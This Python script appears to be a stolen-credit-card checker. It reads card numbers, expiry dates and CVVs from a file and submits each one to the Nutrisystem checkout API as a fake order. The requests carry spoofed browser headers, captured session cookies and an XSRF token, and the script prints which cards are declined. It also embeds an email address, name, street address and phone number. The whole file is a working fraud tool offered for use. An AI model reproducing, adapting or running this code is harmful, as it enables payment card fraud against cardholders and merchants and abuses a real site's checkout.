import requests,re
import json
def extract_numbers(text):
    return re.findall(r'\d+', text)
file=input('enter file text: ')
file=open(file,'r')
for file in file:
	card=file.strip().split('\n')[0]
	try:
		numbers = extract_numbers(card)
	except:
		break
	card=(numbers[0]+'|'+numbers[1]+'|'+numbers[2]+'|'+numbers[3])
	url = "https://www.nutrisystem.com/checkout"
	
	payload = json.dumps({
	  "gender": "female",
	  "height_feet": "NaN",
	  "height_inches": "NaN",
	  "weight": "NaN",
	  "email_address": "arafbaba29@gmail.com",
	  "password": None,
	  "check_newsletter": None,
	  "shipping_address_id": None,
	  "shipping_first_name": "Ayan",
	  "shipping_last_name": "islam",
	  "shipping_address_line_1": "21 Carver Lane",
	  "shipping_address_line_2": None,
	  "shipping_city": "New York",
	  "shipping_state": "NY",
	  "shipping_country": "US",
	  "shipping_zip_code": "10080",
	  "phone_number": "(541) 886-9529",
	  "phone_type": "mobile",
	  "phone_id": 60000992793,
	  "save_to_address_book": None,
	  "is_preferred": None,
	  "autodelivery": False,
	  "subscriptionPlanId": "9018",
	  "nsPrimeFlag": False,
	  "partnerFirstName": None,
	  "partnerLastName": None,
	  "partnerEmail": None,
	  "partnercheckSplOffer": 0,
	  "isFinancialResponsible": False,
	  "is_bussiness": False,
	  "isAutodialOptin": False,
	  "isAutotextOptin": False,
	  "addressUpdatedOnBilling": True,
	  "payment_provider_id": 9,
	  "payment_method_id": None,
	  "securepay_payment_method_id": None,
	  "is_preferred_credit_card": True,
	  "is_ez_pay": False,
	  "ezpay_type": None,
	  "securePay": False,
	  "device_data": "{\"correlation_id\":\"571932a6b4414dbd3b233b4f30eba17b\"}",
	  "credit_card": {
	    "card_name": None,
	    "card_number": numbers[0],
	    "expiration_month": numbers[1],
	    "expiration_year": "20"+numbers[2],
	    "card_cvv": numbers[3],
	    "billing_shipping_same": True,
	    "credit_card_provider": "Braintree"
	  },
	  "paypal": {
	    "checkout": None,
	    "paypal_flow": "vault"
	  },
	  "affirm": {
	    "checkout_token": None
	  },
	  "venmo": {
	    "checkout": None,
	    "paymentMethodUsage": "multi_use"
	  },
	  "applePay": {
	    "checkout": None
	  },
	  "googlePay": {
	    "checkout": None
	  },
	  "billing_address_id": None,
	  "billing_first_name": None,
	  "billing_last_name": None,
	  "billing_address_line_1": None,
	  "billing_address_line_2": None,
	  "billing_city": None,
	  "billing_state": None,
	  "billing_zip_code": None,
	  "billing_country": None,
	  "adTerms": None
	})
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
	  'x-newrelic-id': "VwQFVlJbGwUFUVRaAwgFXw==",
	  'x-xsrf-token': "eyJpdiI6IjJ1eW1zVE1xRmhnTlhDTnhXNWh0dkE9PSIsInZhbHVlIjoiRW1wbmxmSU9Bd2xsMlVVNjk3ZklPemdTRHI2V0FIOTliTURtM0FvelVmdnRwVzFxVm5MUDgxZUswS0tSUmcrR1ZQdUpZTExXc0FCYnpZMnVHSi96NU9SOXJwUWo4c2o3TlJaMHoxdXlYMDQrTmkwT0VYdk51c0FXeHNtWk15WEkiLCJtYWMiOiIzZDg3NDc5Y2M1YWI3MjhmYmEyNTQ2ZGFmN2RmZTg5Yzg0ZjMzZWE1OTVlMjlmZDFjMzdlMzFhODA3ZWU5ZDlmIiwidGFnIjoiIn0=",
	  'tracestate': "322748@nr=0-1-322748-718312786-4b8e86e603f009a3----1718838280004",
	  'traceparent': "00-24741987c77832b35a3eac71f29194f0-4b8e86e603f009a3-01",
	  'sec-ch-ua-mobile': "?1",
	  'newrelic': "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMyMjc0OCIsImFwIjoiNzE4MzEyNzg2IiwiaWQiOiI0YjhlODZlNjAzZjAwOWEzIiwidHIiOiIyNDc0MTk4N2M3NzgzMmIzNWEzZWFjNzFmMjkxOTRmMCIsInRpIjoxNzE4ODM4MjgwMDA0fX0=",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://www.nutrisystem.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.nutrisystem.com/checkout/review",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i",
	  'Cookie': "EDGESCAPE_COUNTRY=BD;EDGESCAPE_REGION=;CCPA=false;DONOTSELL=false;SSLB=1;SSSC=532.G7387465993045461334.1|70431.2359398:76829.2484862:78074.2516265:80539.2581954:82477.2629777:82863.2637009:82915.2638194:83318.2645708:83466.2648798;_gcl_au=1.1.112115555.1720028466;_gid=GA1.2.1749783121.1720028467;_hjSessionUser_457229=eyJpZCI6IjIxYTRiYTcwLWVlY2UtNTQzNS1iODQzLWI5Nzc0ZDZmMTVmNiIsImNyZWF0ZWQiOjE3MjAwMjg0NjkxNDEsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_457229=eyJpZCI6IjIxZWU0OWI3LThjNGQtNGIyMC1hOTc3LTI1MzNjYmY3OTc0ZCIsImMiOjE3MjAwMjg0NjkxNDcsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=;_clck=igjw5w%7C2%7Cfn5%7C0%7C1645;__pdst=6be90e0798f841e89181a0819e5c0cb7;session=1;ndp_session_id=fda3d2ab-e960-4917-b290-6775bf7c9429;_tt_enable_cookie=1;_ttp=Et-gOQ0TcbgP0zCQCnmEeCgx22h;sa-user-id=s%253A0-c2205565-dd2e-5574-6714-ea7414325aed.Cj9In3Y6NMiDRO5bCuIyvNE00EeOlzV4nNGad%252Fm%252F6V8;sa-user-id-v2=s%253AwiBVZd0uVXRnFOp0FDJa7RuTyB4.9owwNb4e%252BfQdm64qJNY8yH0dfYqzk8n84Nc%252B4uumObI;sa-user-id-v3=s%253AAQAKINqbPeUWKZ9pVUS9kPXzzpC74TTCyqMcUbDs7coUHRKOEAMYAyC2mpa0BjABOgSfErgTQgQ9fjpn.I4opkjkI9vpzvD7DIt90%252FB5fIFGbGcQhnZmm9ofT7ks;_pin_unauth=dWlkPVlUQmxOemhtWkdJdE16RXpZaTAwTlRFNUxUZzBOV0V0TTJWbFpXVmpNak5qT1RSaA;addshoppers.com=2%7C1%3A0%7C10%3A1720028471%7C15%3Aaddshoppers.com%7C44%3AMzJjZGEzMmE5ZjRmNDgyYzk0ZmJiZTIyZmY2MGNmMTc%3D%7C51761407a1c3301b0920275f7890865b7d1c6b3b850436fd7f13bce9a5cebcd5;_iconTracker=IC.P2.e6223zX.qNZm9PH;AKA_A2=A;tkbl_session=4e6e09d0-9941-47b5-9f23-1382b56cc859;__attentive_id=43d7aaeeb676491e8587f1c07cf26e88;_attn_=eyJ1Ijoie1wiY29cIjoxNzIwMDI4NDc2MTI2LFwidW9cIjoxNzIwMDI4NDc2MTI2LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjQzZDdhYWVlYjY3NjQ5MWU4NTg3ZjFjMDdjZjI2ZTg4XCJ9In0=;__attentive_cco=1720028476132;__attentive_ss_referrer=https://www.nutrisystem.com/;bounceClientVisit1389v=N4IgNgDiBcIBYBcEQM4FIDMBBNAmAYnvgO6kB0AdgK4IBOAligJ4oICmAtmQMYD2HREABoQtGCGEhGAfQDmvaSjYoU9XhRgAzAIZglImbIiLlq9Vt1KAvkA;__attentive_dv=1;_fbp=fb.1.1720028479044.175939339423671337;EDGESCAPE_COUNTRY=BD;EDGESCAPE_REGION=;CCPA=false;DONOTSELL=false;attntv_mstore_email=arafbaba29@gmail.com:0;ak_bmsc=3D487969B22F9E4167D25014F3617C90~000000000000000000000000000000~YAAQOkw5F3aZunaQAQAAyVOxeRj3xgNsm721/vou4MxBNTrHbPMQTRrXjaWdUCxRdV1HWiTeGVmpQX6NUaFvWPAssjpQ89ygPEUvcSPALCEc1xDAdTSbIdyjKMuqpSZ0GnQJ9ebBdXUcsbfVRR2RcVkQ0Ne3t97dIS0ci1aIivzceqIqJUUpae52thnEh/0lhIu+f4rZnPYK8BxJD9H+ZZH5Yv5bnNZSp0zXRhgBZWLza8iXYw3LMjyxGM5Qob+Qlh4/xCqmK8/uZtS4e9/6zIP3e/flAlcKW+DyaemNFOspKozibuK1I00UCk+4jzOS0trwdXhnwZNZozDIZkLksukF072qiO/H7OxRofLsuJ9DI/Il47D+4HWlinDHTdy6ZJHfq2jziBMOgq16Klk6NKJuKy6spErtaD268CJkxuCupVb1BT1ki9tqrFjQBScmQ47C2a+yUJUQ7EytV6ZxPVg=;ab.storage.deviceId.d22ed2e5-c71c-469b-902a-2f40d4db4cd9=%7B%22g%22%3A%224e974521-5bf0-1508-5aab-a69f8ee8231f%22%2C%22c%22%3A1720028469912%2C%22l%22%3A1720028584114%7D;ab.storage.userId.d22ed2e5-c71c-469b-902a-2f40d4db4cd9=%7B%22g%22%3A%2260003133446%22%2C%22c%22%3A1720028584100%2C%22l%22%3A1720028584118%7D;SSID=CQDLzR1-AAAAAAAujYVmVsnAIS6NhWYBAAAAAABakVF5Lo2FZgAinB8TAQNmACQALo2FZgEAmzoBAcJlJwAujYVmAQD6MAEBKWUmAC6NhWYBAHZFAQHMXigALo2FZgEAHSwBA37qJQAujYVmAQDjQwEBckEoAC6NhWYBAC1CAQORICgALo2FZgEAr0MBAdE8KAAujYVmAQAKRgEB3mooAC6NhWYBAA;_gtm_checkoutStep=2;gtm_page_view=9;__wid=385720263;ftr_blst_1h=1720028761769;attntv_mstore_phone=5418869529:0;SSRT=H5GFZgADAA;_abck=664BEDC399FC99A6EA3D00ABD5B15821~0~YAAQOkw5F6qNu3aQAQAAffS+eQzXYsPrJUhD6XRY6s63bDJf8135I0zBHHppk0HRPuDo03ssHvgMPecQznhAfBcw5HO32iw46zGZNqXRKXfL6D2dMUevDmgkF6+IQsA8p6Ar3XRWphgS/nnz8DsG21FVzDI7KdZ93fDM9JR0qblEV5qa3OvehXAXUqhk6u1z8hu2OEerdZUa5g5cz6M2kbSSRF5HDCskI5liqOCBrzbsmauVVw1mpjgLYFHDDGbYlxVd5277gPwjOyqo0hTzcZUjUjBKaoP9ATX9vlT9IoyLXTyn3Kb7eruV8fKYSMJntyEamNp9uAInIatVjjFlKj/m9ScnafRyMvFzUa//snHz4i4ALily5OW7ZDOKDZtMGWGJ6cEOQCli07zyscm6zBU8+3xtKP6NlLB83uas~-1~-1~-1;cart=eyJpdiI6IjFFbG5GNGtvZEpqNkFzZ3VnQVhLSGc9PSIsInZhbHVlIjoiREVBT2ltcGlWSkJCTTU1ZENOUDRaSG1HRk1qSEE1NGI4MC9zSC94U2Z0K2tPZzhMYTNTVGdpa1h5TDlROTk0bXNibDNvVkZqS2hrWENMTldWeTZVLzB4aDNHUWJzMExGa1hPdTI0bUFuenhEc3diVmNxYzNVeTRiV0duWm5iOHRwTUNESkd1b0NlU1ZibVlBcjZVSUk3SzRSUVJoTm9zRm51c0gwb1RrcUxRTnlRR1d0VEZzT0tWKzdmOVJFcW1SenFJRFF4Zzk2ZnRsTk8xWVRMRjNxWUtSQi9sdUFpajRPcDFXallxRVFvQW5kVUNWc2JNODY1eVd2L2xPUXozRytmYm5ZYm8yVzc1UDJVUjZmMjd2RVJmQlBIbFpRcXc1VXZGT0J5TGlZMTBzRjZRNXozOGFVRmh1bWJBZzVQZit2N1dzZlVkRUZ4RjVFYkFXQzU0WUl2SUZIV0o4bTBqK1dJK1c1ZWR6MlFiQzYzQktqZWFrbndRMDZUa09NNzFKY0ZkQ1Q3bkQ1R0RTWUYzZVlwUWliSUxHSkFRTzVFT2pJTEFPUk91V0pBaWEyUERHT1FPOGxFM0hSMmtoa0hTbExkR1lNcy9Wa3I5bnlPUnI2U1kyZ3lPbE1Lak8xb0lDcEVGcUZQSUs0K05McnNrMnVRRG1oY2RpSGwwQlE4dGoiLCJtYWMiOiIyZjUyZTkzNjM0ZWM0ZGM5ZWU2YTY1MTAxMTgxY2M0Yzc4MWJmYTM1NTg5M2EyMWQyNGI3ZTNmZTQ5MWNhZmQ3IiwidGFnIjoiIn0%3D;bm_sz=0E7A15DAAEE935EF68B2CE734AC46987~YAAQOkw5F2mOu3aQAQAAOwC/eRiUPQrecyt6VKDG7hyEOxGnt6juOsGbLKMcja8sZepHOnPyqQi4AaRMQtITHOd7lnFjrPhrWmKWiYXTIBN1vrBfNvp5KWhOamPq5ST+7WqpkT2eHG/8lso1/q98/SAGPfv1yaLBWnioToIgWdzybOw5Kk0cTbEcEaxSZlyD9guH7fHkW+nfneh3MrAx2KJAtsWaKLKaT6XCPmZhmgqV6Rhp0EqQZCbhydD7TSSiwnVusbi/NNrC8IMs1PFi4ZG/p0wDlDLWopNaLsN/IqxDtJiigA0asKxSxAnPkkU7PJyOMxWRk1/ObG7nFzdwmstt7bRLuHS7U5YDz240bAXbzwNi4KfqL01UJ2k3TT+dtagcr+bv8SWUhmRb54z5tZA1VmcgUB669PmCtAcjDwpH4TQ2B/oBF7YPWi37giWmj74cBwYhrR0e/N/UzYMAywqqNv4w5/llGd+knXh4m7qCq2V6GK7VA/GP6fs2Xtx2iAAvqxPM5gN1eAHa~3683906~3683140;SSOD=AGJfAAAASABrCWEAAQAAAC6NhWYujYVmAQC2SigADwAAAC6NhWYkkYVmDwB23WgAFAAAAC6NhWYokYVmFAAvaH0ADgAAAC6NhWYkkYVmDgAAAA;laravel_session=eyJpdiI6InNNVk5mcGFnZ3JwbGt4SGZ4NnlLWUE9PSIsInZhbHVlIjoiRC8wTTZNcTZUVHkvdm9VUmFrUE11ZFhlRlZCellhZktWd1FqZ2JPazYvRlgzMWs1czJYYUJ2M3dmTXhDQXM2dUZaZFVQVkJlcGFXYzBaVTNYcVRXbVVmWm8wQ3BJdFBuQjlPT0tXNkxqeVFpQVBqNmhwbGp5SmhycWZrcmQyd2siLCJtYWMiOiJmMmNiN2YyNzQ3MDJlZmVjMTdlMGE2YmY2NjQ1YTdlNTMwY2JhNGRjMDEwMjA3NzA3ZGUyZDQ0YzU2M2I0MDY1IiwidGFnIjoiIn0%3D;XSRF-TOKEN=eyJpdiI6IlBhOCtXb2FyR1dvWG5XY0toMkwvYmc9PSIsInZhbHVlIjoiR1h5b205NUxYTmpuU25XSW10d25BWXZ1aS9aczF2Ykwrc0RYSWcyWUl0N0Q1bllxQzJwK1NtV0JhU0JlOUdZbkxsYXl0aUxWVlVkOE5Cc3I0NVB0UXVoVVdaSC9RUXlWTTUzdWdodDdFUUxITk5hdkoycXFqNjZtOG1kMFlXZTYiLCJtYWMiOiJlYTJiNmFmYjIzMDNmZGRiMDU3NWU5OWZiYzE3ODcxMDY1MjkwMzliYTgxMjhlYmI1ZGRhMGU2NjMwYjU4YjkwIiwidGFnIjoiIn0%3D;bm_sv=3CC3AC3036ACAE5D1505FF81E155907C~YAAQOkw5FxuPu3aQAQAAGQm/eRjH6LE5aTZb/YCL4lXacVqO3UmJ76vTWRtlQihn02sNOyfTlaAaShmCZ2dfpWOq/+0KnYeWv3ifEE6V/aiGO6b3Qr+q9s/X6cLGFo9gn/7y9Y2kul9GdO+7HKr59jj7pLefjPaOBmpwVQPEvjCwpJDwAa1OwGSsgIMym5GpuOW0Nb26dbEy4YJ94oX2q/QblDFJSaESSkA8Y6lzHAaOYLwvkHq1sUprwVPRqx9+b68mwfid~1;_ga=GA1.2.1181471950.1720028467;_ga_8P38JZ2FMB=GS1.1.1720028466.1.1.1720029482.47.0.0;_tq_id.TV-09728154-1.a6b7=7bab17180d25cc3f.1720028476.0.1720029483..;_uetsid=6e253ac0396311ef8dc34d7736978d8c;_uetvid=6e25b500396311efa6ced73eb3573fd9;ab.storage.sessionId.d22ed2e5-c71c-469b-902a-2f40d4db4cd9=%7B%22g%22%3A%22f831b081-2fe9-f1e3-4486-bb26cff23d49%22%2C%22e%22%3A1720031283319%2C%22c%22%3A1720028584107%2C%22l%22%3A1720029483319%7D;__attentive_pv=11;_clsk=1ac4e50%7C1720029485399%7C11%7C1%7Cv.clarity.ms%2Fcollect;forterToken=31732856cf174a5c8daa7ac124d0b3ec_1720029479911__UDF43-m4_13ck;RT="
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	if 'sorry' in response.text:
		print(card,'| You Card Declined')
	else:
		print(card,response.text)